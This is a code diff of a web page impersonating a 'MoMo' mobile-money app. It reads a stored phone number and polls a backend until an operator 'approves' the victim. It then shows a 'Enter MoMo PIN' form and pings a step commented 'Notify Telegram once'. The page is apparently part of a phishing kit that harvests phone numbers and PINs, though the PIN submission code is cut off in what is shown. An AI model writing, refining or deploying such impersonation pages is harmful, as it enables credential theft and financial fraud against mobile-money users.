@@ -29,7 +29,7 @@ body {
   margin: 40px auto;
   padding: 25px;
   border-radius: 15px;
-  display: none;
+  display: none; /* hidden until approved */
 }
 
 input {
@@ -52,9 +52,14 @@ button {
   border: none;
   border-radius: 10px;
   font-weight: bold;
-  cursor: pointer;
 }
 
+.footer {
+  margin-top: 20px;
+  font-size: 12px;
+}
+
+/* STATUS TEXT */
 .status {
   margin-top: 80px;
   font-size: 16px;
@@ -68,27 +73,31 @@ button {
   MoMo App
 </div>
 
-<!-- STATUS -->
+<!-- STATUS MESSAGE -->
 <div id="statusBox" class="status">
   ⏳ Waiting for approval...
 </div>
 
-<!-- PIN BOX -->
+<!-- PIN FORM -->
 <div class="container" id="pinContainer">
   <h3>Enter MoMo PIN</h3>
 
   <p id="phoneDisplay"></p>
 
   <form id="pinForm">
-    <input type="password" maxlength="6" placeholder="Enter PIN" required>
+    <input type="password" placeholder="****" maxlength="5" required>
     <button type="submit" id="pinBtn">Confirm</button>
   </form>
+</div>
+
+<div class="footer">
+  2026@MoMo Verified
 </div>
 
 <script>
 const phone = localStorage.getItem("phone");
 
-// if no phone → go back
+// If no phone, go back
 if (!phone) {
   window.location.href = "/";
 }
@@ -96,10 +105,17 @@ if (!phone) {
 const statusBox = document.getElementById("statusBox");
 const pinContainer = document.getElementById("pinContainer");
 
-// STATUS CHECK LOOP
+// CHECK STATUS LOOP
 async function checkStatus() {
   try {
-    const res = await fetch("/status/" + phone);
+    const res = await fetch("/check-status", {
+      method: "POST",
+      headers: {
+        "Content-Type": "application/json"
+      },
+      body: JSON.stringify({ phone })
+    });
+
     const data = await res.json();
 
     if (data.status === "pending") {
@@ -117,7 +133,7 @@ async function checkStatus() {
 
       document.getElementById("phoneDisplay").innerText = "Number: " + phone;
 
-      // notify backend once
+      // Notify Telegram once
       fetch("/pin-step", {
         method: "POST",
         headers: {
@@ -127,22 +143,16 @@ async function checkStatus() {
       });
     }
 
-    else {
-      statusBox.innerHTML = "⚠️ Unknown status";
-      setTimeout(checkStatus, 3000);
-    }
-
   } catch (err) {
-    console.log(err);
     statusBox.innerHTML = "⚠️ Network error...";
     setTimeout(checkStatus, 3000);
   }
 }
 
-// start checking
+// START CHECK
 checkStatus();
 
-// PIN submit (UI only)
+// PIN SUBMIT (UI ONLY)
 document.getElementById("pinForm").addEventListener("submit", function(e) {
   e.preventDefault();
 
